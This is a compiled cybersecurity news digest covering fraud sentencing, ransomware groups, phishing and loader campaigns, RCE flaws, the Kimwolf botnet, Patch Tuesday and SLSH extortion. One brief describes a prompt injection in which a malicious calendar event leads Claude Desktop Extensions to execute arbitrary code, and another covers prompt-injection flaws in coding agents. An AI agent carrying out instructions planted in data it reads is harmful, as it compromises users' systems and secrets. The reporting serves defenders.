      Daren Li, 42, a dual national of China and St. Kitts and Nevis has been sentenced in absentia in the U.S. to the statutory maximum of 20 years in prison and three years of supervised release for his international cryptocurrency investment scheme known as pig butchering or romance baiting that defrauded victims of more than $73.6 million. Li pleaded guilty to his crime in November 2024. However, the defendant cut off his ankle monitor and fled the country in December 2025. His present whereabouts are unknown. "As part of his plea agreement, Li admitted that unindicted members of the conspiracy would contact victims directly through unsolicited social-media interactions, telephone calls and messages, and online dating services," the U.S. Justice Department said. "The unindicted co-conspirators would gain the trust of victims by establishing either professional or romantic relationships with them, often communicating by electronic messages sent via end-to-end encrypted applications." The co-conspirators established spoofed domains and websites that resembled legitimate cryptocurrency trading platforms and tricked victims into investing in cryptocurrency through these fraudulent platforms after gaining their trust. Li also confessed that he would direct co-conspirators to open U.S. bank accounts established on behalf of 74 shell companies and would monitor the receipt of interstate and international wire transfers of victim funds. "Li and other co-conspirators would receive victim funds in financial accounts that they controlled and then monitor the conversion of victim funds to virtual currency," the department said.

0-Click AI Prompt RCE Risk

0-Click Flaw in Claude Desktop Extensions


      A zero-click remote code execution vulnerability (CVSS score: 10.0) in Claude Desktop Extensions (DXT) could be exploited to silently compromise a system by a simple Google Calendar event when a user issues a harmless prompt like "Please check my latest events in google cal[endar] and then take care of it for me." The problem stems from how MCP-based systems like Claude DXT autonomously chain together different tools and external connectors to fulfil user requests without enforcing proper security boundaries. The phrase "take care of it" does the heavy lifting here, as the artificial intelligence (AI) assistant interprets it as a justification to execute arbitrary instructions embedded in those events without seeking users' permission. The flaw impacts more than 10,000 active users and 50 DXT extensions, according to LayerX. "Unlike traditional browser extensions, Claude Desktop Extensions run unsandboxed with full system privileges," the browser security company said. "As a result, Claude can autonomously chain low-risk connectors (e.g., Google Calendar) to high-risk local executors, without user awareness or consent. If exploited by a bad actor, even a benign prompt ('take care of it'), coupled with a maliciously worded calendar event, is sufficient to trigger arbitrary local code execution that compromises the entire system." Anthropic has opted not to fix the issue at this time. A similar Google Gemini prompt injection flaw was disclosed by Miggo Security last month.

Data-Theft Ransomware Surges

Coinbase Cartel Claims Over 60 Victims


      A nascent ransomware group called Coinbase Cartel has claimed more than 60 victims since it first emerged in September 2025. "Coinbase Cartel operations are marked by an insistence on stealing data while leaving systems available rather than complementing data theft with the use of encryptors that prohibit system access," Bitdefender said. The healthcare, technology, and transportation industries represent a major chunk of Coinbase Cartel's greatest victim demographic to date. The healthcare organizations impacted by the threat actor are primarily based in the U.A.E. Some of the other prominent groups that are focused on only data theft are World Leaks and PEAR (Pure Extraction and Ransom). The development paints a picture of an ever-evolving ransomware landscape populated by new and old actors, even as the threat is getting increasingly professionalized as attackers streamline operations. According to data from Cyble, 6,604 ransomware attacks were recorded in 2025, up 52% from the 4,346 attacks claimed by ransomware groups in 2024.

Google Expands Privacy Takedowns

Google Adds New Options "Results about you" 


      Google has expanded its "Results about you" tool to give users more control over sensitive personal information and added a way to request removal of non-consensual explicit images from search results, as well as other details like driver's license numbers, passport numbers, and Social Security numbers. "We understand that removing existing content is only part of the solution," Google said. "For added protection, the new process allows you to opt in to safeguards that will proactively filter out any additional explicit results that might appear in similar searches."

Monitoring Tools Used for Ransomware

Crazy Ransomware Gang Abuses Net Monitor and SimpleHelp 


      Threat actors have been observed leveraging Net Monitor, a commercial workforce monitoring tool, with SimpleHelp, a legitimate remote monitoring and management (RMM) platform, as part of attacks designed to deploy Crazy ransomware. The two incidents, believed to be the work of the same threat actor, took place in January and February 2026. Net Monitor comes with various capabilities that go beyond employee productivity tracking, including reverse shell connections, remote desktop control, file management, and the ability to customize service and process names during installation. These features, coupled with SimpleHelp's remote access functionality, make them attractive tools for attackers looking to blend into enterprise environments without deploying traditional malware. What's more, Net Monitor for Employees Professional bundles a pseudo-terminal ("winpty-agent.exe") that facilitates full command execution. Bad actors have been found to leverage this aspect to conduct reconnaissance, deliver additional payloads, and deploy secondary remote access channels, turning it into a functional remote access trojan. "In the cases observed, threat actors used these two tools together, using Net Monitor for Employees as a primary remote access channel and SimpleHelp as a redundant persistence layer, ultimately leading to the attempted deployment of Crazy ransomware," Huntress said.

0APT Victim Claims Questioned

0APT's 200 Victim Count Likely a Hoax


      A threat actor called 0APT appears to be falsely claiming that it has breached over 200 victims within a span of a week since launching their data leak site on January 28, 2026. Further analysis has determined that the victims are a blend of wholly fabricated generic company names and recognizable organizations that threat actors have not breached, GuidePoint's Research and Intelligence Team said. The data leak site went offline on February 8, 2026, before resurfacing the next day with a list of more than 15 very large multinational organizations. "0APT is likely operating in this deceptive manner in order to support extortion of uninformed victims, re-extortion of historical victims from other groups, defrauding of potential affiliates, or to garner interest in a nascent RaaS group," security researcher Jason Baker noted. While signs suggest that the group may be bluffing about its victim count, the Windows and Linux ransomware samples have been found to be fully operational, per Halcyon. It's worth pointing out that ransomware groups like RansomedVC have listed fabricated attacks on their data leak sites to deceive victims. Viewed in that light, 0APT's exaggerated claims are likely an attempt to gain visibility and momentum among its peers. Its origins remain unknown.

SYSTEM RCE via Named Pipe

Flaw in Quest Desktop Authority Detailed


      A high-risk security vulnerability (CVE-2025-67813, CVSS score: 5.3) within Quest Desktop Authority could allow attackers to execute remote code with SYSTEM privileges. "Quest KACE Desktop Authority exposes a named pipe (ScriptLogic_Server_NamedPipe_9300) running as SYSTEM that accepts connections from any authenticated domain user over the network," NetSPI said. The named pipe implements a custom IPC protocol that supports dangerous operations, including arbitrary command execution, DLL injection, credential retrieval, and COM object invocation. Any authenticated user on the network can achieve remote code execution as a local administrator on hosts running the Desktop Authority agent.

AI Traffic Scans to Block VPNs

Russia to Analyze Internet Traffic Using AI to Flag VPN Usage


      Russia's internet watchdog will use artificial intelligence (AI) technology to analyze internet traffic and restrict the operation of VPN services, Forbes Russia reported. The Roskomnadzor is expected to spend close to $30 million to develop the internet traffic filtering mechanism this year. The Russian government has blocked access to tens of VPN apps in recent years. It also maintains a registry of banned websites.

Mispadu Expands Banking Attacks

Mexico and Brazil Targeted by Mispadu Trojan


      Cofense said it has observed Mispadu campaigns targeting Latin America, particularly Mexico and Brazil, and to a lesser extent in Spain, Italy, and Portugal, with phishing emails containing HTML Application (HTA) attachments that are designed to bypass Secure Email Gateways (SEGs) to reach the inboxes of employees across the world. "The only variation is that sometimes the URL delivering the HTA files is embedded in an attached, password-protected PDF rather than embedded in the email itself," Cofense said. "In all recent campaigns, Mispadu makes use of an AutoIT loader and various legitimate files to run the malicious content. Each step of the delivery chain from the attached PDF to the AutoIT script is dynamically generated. This means that every hash except for the AutoIT compiler is unique to each install, further frustrating EDR." Recent iterations of the banking trojan come with the ability to self-propagate on infected hosts via email and expand the target online banking websites to include banks outside of Latin America as well as cryptocurrency-based exchanges.

ScreenConnect Deployed via Phish

Phishing Campaign Delivers ConnectWise ScreenConnect for Remote Access


      In a phishing campaign documented by Forcepoint, spoofed emails have been found to deliver a malicious .cmd attachment that escalates privileges, disables Windows SmartScreen, removes the mark-of-the-web (MotW) to bypass security warnings, and ultimately installs ConnectWise ScreenConnect. The campaign has targeted organizations across the U.S., Canada, the U.K., and Northern Ireland, focusing on sectors with high-value data, including government, healthcare, and logistics companies. Recent phishing attacks have also abused web services from Amazon, like Simple Storage Service (S3) buckets, Amazon Simple Email Service (SES), and Amazon Web Services (AWS) Amplify to slip past email security controls and launch credential phishing attacks. Other phishing attacks have embraced uncommon techniques like using edited versions of legitimate business emails to deliver convincingly spoofed emails to recipients. "These emails work by having the threat actor create an account on a legitimate service and input arbitrary text into a field that will later be included in outgoing emails," Cofense said. "After this is done, the threat actor would need to receive a legitimate email that happens to include the malicious text that was created by the threat actor. Once the email is received, the threat actor can then redirect the email to the intended victims."

In a phishing campaign documented by Forcepoint, spoofed emails have been found to deliver a malicious .cmd attachment that escalates privileges, disables Windows SmartScreen, removes the mark-of-the-web (MotW) to bypass security warnings, and ultimately installs ConnectWise ScreenConnect.

CrashFix Delivers SystemBC

CrashFix Variant Attack Delivers Python Implants and SystemBC 


      A variant of the ClickFix attack called CrashFix has been used to deliver malicious payloads consistent with a known malware called SystemBC. Unlike the CrashFix-style social engineering flow documented by Huntress and Microsoft, the attack stands out because it did not involve the use of a malicious browser extension. "Instead, the victim was convinced to execute a command via the Windows Run dialog (Win+R) as seen with traditional ClickFix," Binary Defense said. "This command abused a legitimate Windows binary – finger.exe – copied from System32, renamed, and executed from a user-writable directory. The output of this execution was piped directly into cmd.exe, acting as a delivery mechanism for an obfuscated PowerShell payload." The PowerShell code then retrieves follow-on content, including Python backdoors and a DLL implant that overlaps with SystemBC, from attacker-controlled infrastructure, while taking steps to fingerprint the host and clean up artifacts on disk. "The coexistence of Python backdoors and a reflective DLL implant highlights a deliberate defense-evasion and persistence strategy," the company said. "By mixing scripting-based and native implants, the attacker reduced reliance on any single execution method, making complete eviction more difficult."

Bing Ads Funnel Tech Scams

Fake Bing Ads Lead to Tech Support Scams


      Malicious ads served on Bing search results when searching for sites like Amazon are being used to redirect unsuspecting users to tech support scam links hosted in Azure Blob Storage. The campaign targeted healthcare, manufacturing, and technology sectors in the U.S. "Clicking on the malicious ad sent the victims to highswit[.]space, a newly registered domain hosting an empty WordPress site, which then redirected them to one of the Azure Blob Storage containers, which served a typical tech support scam site," Netskope Threat Labs said.

Chinese VPN Infra Footprint Expands

Chinese VPN Used by Devices in Russia, China, Myanmar, Iran, and Venezuela


      A Chinese virtual private network (VPN) provider named LVCHA VPN has been used by devices in Russia, China, Myanmar, Iran, and Venezuela. It also has an Android app that's directly hosted on its website ("lvcha[.]in") and distributed via the Google Play Store. Further analysis of the domain has uncovered a cluster of nearly 50 suspicious domains, all of which promote the same VPN. "Whenever we see campaigns promoting suspicious downloads or products using so many domains, it can indicate that the operator is rotating domains to work around country-level firewalls in regions where they’re trying to promote distribution," Silent Push said.

Grid Attack Triggers Western Alerts

U.K. and U.S. Issue Warning After Poland Energy Grid Cyber Attack


      Following a late December 2025 coordinated cyber attack on Poland's power grid, the U.S. Cybersecurity and Infrastructure Security Agency (CISA) has published a bulletin for critical infrastructure owners and operators. CISA said vulnerable edge devices remain a prime target for threat actors, OT devices without firmware verification can be permanently damaged, and threat actors leverage default credentials to pivot onto the HMI and RTUs. "Operators should prioritize updates that allow firmware verification when available," the agency added. "Operators should immediately change default passwords and establish requirements for integrators or OT suppliers to enforce password changes in the future." In a similar development, Jonathan Ellison, director for national resilience at the National Cyber Security Centre (NCSC), has urged critical infrastructure operators in the country to act now and have incident response plans or playbooks in place to respond to such threats. "Although attacks can still happen, strong resilience and recovery plans reduce both the chances of an attack succeeding and the impact if one does," Ellison said.

Telnet Traffic Abruptly Collapses

Global Telnet Traffic Dropped in Mid-January 2026 


      Threat intelligence firm GreyNoise said it observed a steep decline in global Telnet traffic on January 14, 2026, six days before a security advisory for CVE-2026-24061 went public on January 20. CVE-2026-24061 relates to a critical vulnerability in the GNU InetUtils telnet daemon that could result in an authentication bypass. Data gathered by GreyNoise shows that the hourly volume of Telnet sessions dropped 65% on January 14 at 21:00 UTC, then fell 83% within two hours. Daily sessions have declined from an average of 914,000 (from December 1, 2025, to January 14, 2026) to around 373,000, equating to a 59% reduction that has persisted as of February 10, 2026. "Eighteen ASNs with significant pre-drop telnet volume (>50K sessions each) went to absolute zero after January 15," the company said. "Five entire countries vanished from GreyNoise telnet data: Zimbabwe, Ukraine, Canada, Poland, and Egypt. Not reduced to zero." Among the 18 ASNs included were British Telecom, Charter/Spectrum, Cox Communications, and Vultr. Although correlation does not imply causation, GreyNoise has raised the possibility that the telecom operators likely received advance warning about CVE-2026-24061, allowing them to act on it at the infrastructure level. "A backbone or transit provider — possibly responding to a coordinated request, possibly acting on their own assessment — implemented port 23 filtering [to block telnet traffic] on transit links," it said.

New Loaders Fuel Stealer Campaigns

New RenEngine and Foxveil Malware Loaders Spotted 


      Cyderes and Cato Networks have detailed new previously undocumented malware loaders dubbed RenEngine Loader and Foxveil that have been used to deliver next-stage payloads. The Foxveil malware campaign has been active since August 2025. It's engineered to establish an initial foothold, complicate analysis efforts, and retrieve next-stage shellcode payloads from threat actor-controlled staging hosted on trusted platforms like Cloudflare Pages, Netlify, and Discord. Attacks leveraging RenEngine Loader, on the other hand, have employed illegally modified game installers distributed via piracy platforms to deliver the malware alongside the playable content. More than 400,000 global victims are estimated to have been impacted, with most of them located in India, the U.S., and Brazil. The activity has been operational since April 2025. "RenEngine Loader decrypts, stages, and transfers execution to Hijack Loader, enabling rapid tooling evolution and flexible capability deployment," Cyderes said. "By embedding a modular, stealth-focused second-stage loader inside a legitimate Ren’Py launcher, the attackers closely mimic normal application behavior, significantly reducing early detection." The end goal of the attack is to deploy an information stealer called ACR Stealer.

Looker RCE Chain Disclosed

Flaws in Google Looker 


      Two novel security vulnerabilities have been disclosed in Google Looker that could be exploited by an attacker to fully compromise a Looker instance. This includes a remote code execution (RCE) chain via Git hook overrides and an authorization bypass flaw via internal database connection abuse. Successful exploitation of the flaws could allow an attacker to run arbitrary code on the Looker server, potentially leading to cross-tenant access, as well as exfiltrate the full internal MySQL database via error-based SQL injection, according to Tenable. "The vulnerabilities allowed users with developer permissions in Looker to access both the underlying system hosting Looker, and its internal database," Google said. Collectively tracked as CVE-2025-12743, aka LookOut (CVSS score: 6.5), they were patched by Google in September 2025. While the fixes have been applied to cloud instances, users of self-hosted Looker instances are advised to update to the latest supported version.

Trojanized 7-Zip Spreads Proxyware

Malicious 7-Zip Site Distributes Fake Installer with Proxy 


      A fake installer for the 7-Zip file archiver tool downloaded from 7zip[.]com (the legitimate domain is 7-zip[.]org) is being used to drop a proxy component that enrolls the infected host into a residential proxy node. This allows third parties to route traffic through the victim's IP address while concealing their own origins. The installer is digitally signed with a now-revoked certificate originally issued to Jozeal Network Technology Co., Limited. The campaign has been codenamed upStage Proxy by security researcher Luke Acha, who discovered it late last month. "The operators behind 7zip[.]com distributed a trojanized installer via a lookalike domain, delivering a functional copy of 7-Zip File Manager alongside a concealed malware payload," Malwarebytes said. The 7-Zip lure appears to be part of a broader effort that uses trojanized installers for HolaVPN, TikTok, WhatsApp, and Wire VPN. Attack chains involve using YouTube tutorials as a malware distribution vector to direct unsuspecting users to the bogus site, once again highlighting the abuse of trusted platforms.

AI-Built VoidLink Expands Reach

More Details About VoidLink Emerge


VoidLink is a sophisticated Linux-based command-and-control (C2) framework capable of long-term intrusion across cloud and enterprise environments. First documented by Check Point last month, ongoing analyses of the malware have revealed that it may have been developed by a Chinese-speaking developer using an artificial intelligence (AI) model with limited human review. Ontinue, in a report published this week, said it found "strong indicators" that the implant was built using a large language model (LLM) coding agent. "It fingerprints cloud environments across AWS, GCP, Azure, Alibaba Cloud, and Tencent Cloud, harvesting credentials from environment variables, config directories, and instance metadata APIs," security researcher Rhys Downing said. "It detects container runtimes and includes plugins for container escape and Kubernetes privilege escalation. A kernel-level rootkit adapts its stealth approach based on the host's kernel version." Cisco Talos said it has observed the modular framework in campaigns undertaken by a new threat actor codenamed UAT-9921, which is believed to have been active since 2019. The cybersecurity company said it also found "clear indications" of a Windows equivalent of VoidLink that comes with the ability to load plugins. "UAT-9921 uses compromised hosts to install VoidLink command and control (C2), which are then used to launch scanning activities both internal and external to the network," Talos researchers said.

Taken together, these developments show how threat actors are balancing speed with patience — moving fast where defenses are weak, and slowing down where stealth matters more than impact. The result is activity that blends into normal operations until damage is already underway.

For defenders, the challenge isn’t just blocking entry anymore. It’s recognizing misuse of legitimate access, spotting abnormal behavior inside trusted systems, and closing gaps that don’t look dangerous on the surface.

The briefs that follow aren’t isolated incidents. They’re fragments of a wider operating picture — one that keeps evolving week after week.

[4] BleepingComputer - Russia tries to block WhatsApp, Telegram in communication blockade
────────────────────────────────────────────────────────────────────────────────
Tarih: Thu, 12 Feb 2026 17:57:54 -0500
Link: https://www.bleepingcomputer.com/news/security/russia-tries-to-block-whatsapp-telegram-in-communication-blockade/

[TAM METİN - 436 kelime]
The Russian government is trying to block WhatsApp in the country as its crackdown on communication platforms outside its control intensifies.

WhatsApp announced the action against it on X, calling it “a backwards step” that “can only lead to less safety for people in Russia.”

WhatsApp assured its Russian users that it will continue doing everything it can to keep them connected.

According to Russian media, the country’s internet watchdog, Roskomnadzor, had recently excluded the domains whatsapp.com and web.whatsapp.com from the National Domain Name System, citing the official explanation of countering crime and fraud.

In practice, excluding the domains from domestic DNS routing made WhatsApp services accessible only to users who use VPN tools or external resolvers.

However, more aggressive measures are reportedly now in place, with the latest attempt to fully block WhatsApp in Russia. The instant messenger's parent company, Meta, has been designated as an “extremist” entity in Russia since 2022.

WhatsApp saw its first restrictions in the country in August 2025, when Roskomnadzor began throttling voice and video calls. In October 2025, the authorities attempted to block new user registrations.

Presidential press secretary Dmitry Peskov reportedly stated that the authorities are open to allowing WhatsApp to resume operations in the country, provided that Meta complies with local legislation.

WhatsApp blocks came shortly after similar action was taken against Telegram, which was reportedly aggressively throttled earlier this week in Russia.

Telegram’s founder, Pavel Durov, responded to the situation by stating that Russia is trying to encourage its citizens to use the Kremlin-controlled MAX messenger app.

MAX is a controversial communications platform developed by VK, which became mandatory on all electronic devices sold in the country since September 2025.

Although MAX is promoted as a secure app that safeguards national communications from foreign surveillance, several independent reviewers have raised concerns about encryption weaknesses, government access, and extensive data-collection risks.

For now, users in Russia may be able to continue accessing their messengers of choice by using VPN tools, though those are not immune to the government’s crackdown either.

[5] BleepingComputer - Bitwarden introduces ‘Cupid Vault’ for secure password sharing
────────────────────────────────────────────────────────────────────────────────
Tarih: Thu, 12 Feb 2026 16:55:24 -0500
Link: https://www.bleepingcomputer.com/news/security/bitwarden-introduces-cupid-vault-for-secure-password-sharing/

[TAM METİN - 422 kelime]
Bitwarden has launched a new system called ‘Cupid Vault’ that allows users to safely share passwords with trusted email addresses.

Cupid Vault works by allowing users of the free version of Bitwarden to create a 2-person shared vault called an 'Organization'. Other users can access the logins inside the Organization space with credentials assigned by the owner of the account.

Inviting a user (partner, friend, family member) to an Organization can be done by adding their email address as a second member.

This way, Bitwarden users can share in a secure way collections of login pairs for media streaming service accounts or other online platforms.

Setting up an Organization and creating shared collections is possible by logging into the Bitwarden vault via the web interface.

To prevent adversary-in-the-middle enrollment attacks, vault owners can verify through a fingerprint phrase that the intended member is getting access. The shared vault is completely isolated from the personal vault.

Access to the Organization vault and the secrets it contains can be revoked at any time, and sharing can be configured in both directions.

Bitwarden published a detailed guide on how to set up and use Cupid Vault, which explains that ownership of items within a new Organization isn’t tied to their creator, as both members can perform editing or deletion actions.

Bitwarden is a popular open-source password manager that lets users securely store, generate, and autofill passwords and other sensitive information.

It’s cross-platform, supporting a range of browsers, desktop operating systems, and mobile platforms, and protects stored data using end-to-end encryption.

The new Cupid Vault feature, launched ahead of Valentine’s Day, is available at no charge to all users and can be set up through the free plan. However, there’s a limit of 2 Collections and 2 users each.

Family, Teams, and Enterprise plan users already get multiple users, collections, and granular role-based access control permissions, so Cupid Vault is redundant for paying tiers and shouldn’t be confused with the secret-sharing features available to them.

[6] BleepingComputer - Critical BeyondTrust RCE flaw now exploited in attacks, patch now
────────────────────────────────────────────────────────────────────────────────
Tarih: Thu, 12 Feb 2026 16:34:12 -0500
Link: https://www.bleepingcomputer.com/news/security/critical-beyondtrust-rce-flaw-now-exploited-in-attacks-patch-now/

[TAM METİN - 461 kelime]
A critical pre-authentication remote code execution vulnerability in BeyondTrust Remote Support and Privileged Remote Access appliances is now being exploited in attacks after a PoC was published online.

Tracked as CVE-2026-1731 and assigned a near-maximum CVSS score of 9.9, the flaw affects BeyondTrust Remote Support versions 25.3.1 and earlier and Privileged Remote Access versions 24.3.4 and earlier.

BeyondTrust disclosed the vulnerability on February 6, warning that unauthenticated attackers could exploit it by sending specially crafted client requests.

"BeyondTrust Remote Support and older versions of Privileged Remote Access contain a critical pre-authentication remote code execution vulnerability that may be triggered through specially crafted client requests," explained BeyondTrust.

"Successful exploitation could allow an unauthenticated remote attacker to execute operating system commands in the context of the site user. Successful exploitation requires no authentication or user interaction and may lead to system compromise, including unauthorized access, data exfiltration, and service disruption."

BeyondTrust automatically patched all Remote Support and Privileged Remote Access SaaS instances on February 2, 2026, but on-premise customers must install patches manually.

CVE-2026-1731 is now exploited in the wild

Hacktron discovered the vulnerability and responsibly disclosed it to BeyondTrust on January 31.

Hacktron says approximately 11,000 BeyondTrust Remote Support instances were exposed online, with around 8,500 on-premises deployments.

Ryan Dewhurst, head of threat intelligence at watchTowr, now reports that attackers have begun actively exploiting the vulnerability, warning that if devices are not patched, they should be assumed to be compromised.

"Overnight we observed first in-the-wild exploitation of BeyondTrust across our global sensors," Dewhurst posted on X.

"Attackers are abusing get_portal_info to extract the x-ns-company value before establishing a WebSocket channel."

This exploitation comes a day after a proof-of-concept exploit was published on GitHub targeting the same /get_portal_info endpoint.

The attacks target exposed BeyondTrust portals to retrieve the 'X-Ns-Company' identifier, which is then used to create a websocket to the targeted device. This allows the attackers to execute commands on vulnerable systems.

Organizations using self-hosted BeyondTrust Remote Support or Privileged Remote Access appliances should immediately apply available patches or upgrade to the latest versions.

BleepingComputer contacted BeyondTrust and Dewhurst to ask if they had any details on post-exploitation activity and will update this story if we receive a response.

[7] Krebs on Security - Kimwolf Botnet Swamps Anonymity Network I2P
────────────────────────────────────────────────────────────────────────────────
Tarih: Wed, 11 Feb 2026 16:08:11 +0000

[TAM METİN - 831 kelime]
For the past week, the massive “Internet of Things” (IoT) botnet known as Kimwolf has been disrupting The Invisible Internet Project (I2P), a decentralized, encrypted communications network designed to anonymize and secure online communications. I2P users started reporting disruptions in the network around the same time the Kimwolf botmasters began relying on it to evade takedown attempts against the botnet’s control servers.

Kimwolf is a botnet that surfaced in late 2025 and quickly infected millions of systems, turning poorly secured IoT devices like TV streaming boxes, digital picture frames and routers into relays for malicious traffic and abnormally large distributed denial-of-service (DDoS) attacks.

I2P is a decentralized, privacy-focused network that allows people to communicate and share information anonymously.

“It works by routing data through multiple encrypted layers across volunteer-operated nodes, hiding both the sender’s and receiver’s locations,” the I2P website explains. “The result is a secure, censorship-resistant network designed for private websites, messaging, and data sharing.”

On February 3, I2P users began complaining on the organization’s GitHub page about tens of thousands of routers suddenly overwhelming the network, preventing existing users from communicating with legitimate nodes. Users reported a rapidly increasing number of new routers joining the network that were unable to transmit data, and that the mass influx of new systems had overwhelmed the network to the point where users could no longer connect.

I2P users complaining about service disruptions from a rapidly increasing number of routers suddenly swamping the network.

When one I2P user asked whether the network was under attack, another user replied, “Looks like it. My physical router freezes when the number of connections exceeds 60,000.”

A graph shared by I2P developers showing a marked drop in successful connections on the I2P network around the time the Kimwolf botnet started trying to use the network for fallback communications.

The same day that I2P users began noticing the outages, the individuals in control of Kimwolf posted to their Discord channel that they had accidentally disrupted I2P after attempting to join 700,000 Kimwolf-infected bots as nodes on the network.

The Kimwolf botmaster openly discusses what they are doing with the botnet in a Discord channel with my name on it.

Although Kimwolf is known as a potent weapon for launching DDoS attacks, the outages caused this week by some portion of the botnet attempting to join I2P are what’s known as a “Sybil attack,” a threat in peer-to-peer networks where a single entity can disrupt the system by creating, controlling, and operating a large number of fake, pseudonymous identities.

Indeed, the number of Kimwolf-infected routers that tried to join I2P this past week was many times the network’s normal size. I2P’s Wikipedia page says the network consists of roughly 55,000 computers distributed throughout the world, with each participant acting as both a router (to relay traffic) and a client.

However, Lance James, founder of the New York City based cybersecurity consultancy Unit 221B and the original founder of I2P, told KrebsOnSecurity the entire I2P network now consists of between 15,000 and 20,000 devices on any given day.

An I2P user posted this graph on Feb. 10, showing tens of thousands of routers — mostly from the United States — suddenly attempting to join the network.

Benjamin Brundage is founder of Synthient, a startup that tracks proxy services and was the first to document Kimwolf’s unique spreading techniques. Brundage said the Kimwolf operator(s) have been trying to build a command and control network that can’t easily be taken down by security companies and network operators that are working together to combat the spread of the botnet.

Brundage said the people in control of Kimwolf have been experimenting with using I2P and a similar anonymity network — Tor — as a backup command and control network, although there have been no reports of widespread disruptions in the Tor network recently.

“I don’t think their goal is to take I2P down,” he said. “It’s more they’re looking for an alternative to keep the botnet stable in the face of takedown attempts.”

The Kimwolf botnet created challenges for Cloudflare late last year when it began instructing millions of infected devices to use Cloudflare’s domain name system (DNS) settings, causing control domains associated with Kimwolf to repeatedly usurp Amazon, Apple, Google and Microsoft in Cloudflare’s public ranking of the most frequently requested websites.

James said the I2P network is still operating at about half of its normal capacity, and that a new release is rolling out which should bring some stability improvements over the next week for users.

Meanwhile, Brundage said the good news is Kimwolf’s overlords appear to have quite recently alienated some of their more competent developers and operators, leading to a rookie mistake this past week that caused the botnet’s overall numbers to drop by more than 600,000 infected systems.

“It seems like they’re just testing stuff, like running experiments in production,” he said. “But the botnet’s numbers are dropping significantly now, and they don’t seem to know what they’re doing.”

[8] Krebs on Security - Patch Tuesday, February 2026 Edition
────────────────────────────────────────────────────────────────────────────────

[TAM METİN - 515 kelime]
Microsoft today released updates to fix more than 50 security holes in its Windows operating systems and other software, including patches for a whopping six “zero-day” vulnerabilities that attackers are already exploiting in the wild.

Zero-day #1 this month is CVE-2026-21510, a security feature bypass vulnerability in Windows Shell wherein a single click on a malicious link can quietly bypass Windows protections and run attacker-controlled content without warning or consent dialogs. CVE-2026-21510 affects all currently supported versions of Windows.

The zero-day flaw CVE-2026-21513 is a security bypass bug targeting MSHTML, the proprietary engine of the default Web browser in Windows. CVE-2026-21514 is a related security feature bypass in Microsoft Word.

The zero-day CVE-2026-21533 allows local attackers to elevate their user privileges to “SYSTEM” level access in Windows Remote Desktop Services. CVE-2026-21519 is a zero-day elevation of privilege flaw in the Desktop Window Manager (DWM), a key component of Windows that organizes windows on a user’s screen. Microsoft fixed a different zero-day in DWM just last month.

The sixth zero-day is CVE-2026-21525, a potentially disruptive denial-of-service vulnerability in the Windows Remote Access Connection Manager, the service responsible for maintaining VPN connections to corporate networks.

Chris Goettl at Ivanti reminds us Microsoft has issued several out-of-band security updates since January’s Patch Tuesday. On January 17, Microsoft pushed a fix that resolved a credential prompt failure when attempting remote desktop or remote application connections. On January 26, Microsoft patched a zero-day security feature bypass vulnerability (CVE-2026-21509) in Microsoft Office.

Kev Breen at Immersive notes that this month’s Patch Tuesday includes several fixes for remote code execution vulnerabilities affecting GitHub Copilot and multiple integrated development environments (IDEs), including VS Code, Visual Studio, and JetBrains products. The relevant CVEs are CVE-2026-21516, CVE-2026-21523, and CVE-2026-21256.

Breen said the AI vulnerabilities Microsoft patched this month stem from a command injection flaw that can be triggered through prompt injection, or tricking the AI agent into doing something it shouldn’t — like executing malicious code or commands.

“Developers are high-value targets for threat actors, as they often have access to sensitive data such as API keys and secrets that function as keys to critical infrastructure, including privileged AWS or Azure API keys,” Breen said. “When organizations enable developers and automation pipelines to use LLMs and agentic AI, a malicious prompt can have significant impact. This does not mean organizations should stop using AI. It does mean developers should understand the risks, teams should clearly identify which systems and workflows have access to AI agents, and least-privilege principles should be applied to limit the blast radius if developer secrets are compromised.”

The SANS Internet Storm Center has a clickable breakdown of each individual fix this month from Microsoft, indexed by severity and CVSS score. Enterprise Windows admins involved in testing patches before rolling them out should keep an eye on askwoody.com, which often has the skinny on wonky updates. Please don’t neglect to back up your data if it has been a while since you’ve done that, and feel free to sound off in the comments if you experience problems installing any of these fixes.

[9] Krebs on Security - Please Don’t Feed the Scattered Lapsus ShinyHunters

[TAM METİN - 1200 kelime]
A prolific data ransom gang that calls itself Scattered Lapsus ShinyHunters (SLSH) has a distinctive playbook when it seeks to extort payment from victim firms: Harassing, threatening and even swatting executives and their families, all while notifying journalists and regulators about the extent of the intrusion. Some victims reportedly are paying — perhaps as much to contain the stolen data as to stop the escalating personal attacks. But a top SLSH expert warns that engaging at all beyond a “We’re not paying” response only encourages further harassment, noting that the group’s fractious and unreliable history means the only winning move is not to pay.

Unlike traditional, highly regimented Russia-based ransomware affiliate groups, SLSH is an unruly and somewhat fluid English-language extortion gang that appears uninterested in building a reputation of consistent behavior whereby victims might have some measure of confidence that the criminals will keep their word if paid.

That’s according to Allison Nixon, director of research at the New York City based security consultancy Unit 221B. Nixon has been closely tracking the criminal group and individual members as they bounce between various Telegram channels used to extort and harass victims, and she said SLSH differs from traditional data ransom groups in other important ways that argue against trusting them to do anything they say they’ll do — such as destroying stolen data.

Like SLSH, many traditional Russian ransomware groups have employed high-pressure tactics to force payment in exchange for a decryption key and/or a promise to delete stolen data, such as publishing a dark web shaming blog with samples of stolen data next to a countdown clock, or notifying journalists and board members of the victim company. But Nixon said the extortion from SLSH quickly escalates way beyond that — to threats of physical violence against executives and their families, DDoS attacks on the victim’s website, and repeated email-flooding campaigns.

SLSH is known for breaking into companies by phishing employees over the phone, and using the purloined access to steal sensitive internal data. In a January 30 blog post, Google’s security forensics firm Mandiant said SLSH’s most recent extortion attacks stem from incidents spanning early to mid-January 2026, when SLSH members pretended to be IT staff and called employees at targeted victim organizations claiming that the company was updating MFA settings.

“The threat actor directed the employees to victim-branded credential harvesting sites to capture their SSO credentials and MFA codes, and then registered their own device for MFA,” the blog post explained.

Victims often first learn of the breach when their brand name is uttered on whatever ephemeral new public Telegram group chat SLSH is using to threaten, extort and harass their prey. According to Nixon, the coordinated harassment on the SLSH Telegram channels is part of a well-orchestrated strategy to overwhelm the victim organization by manufacturing humiliation that pushes them over the threshold to pay.

Nixon said multiple executives at targeted organizations have been subject to “swatting” attacks, wherein SLSH communicated a phony bomb threat or hostage situation at the target’s address in the hopes of eliciting a heavily armed police response at their home or place of work.

“A big part of what they’re doing to victims is the psychological aspect of it, like harassing executives’ kids and threatening the board of the company,” Nixon told KrebsOnSecurity. “And while these victims are getting extortion demands, they’re simultaneously getting outreach from media outlets saying, ‘Hey, do you have any comments on the bad things we’re going to write about you.”

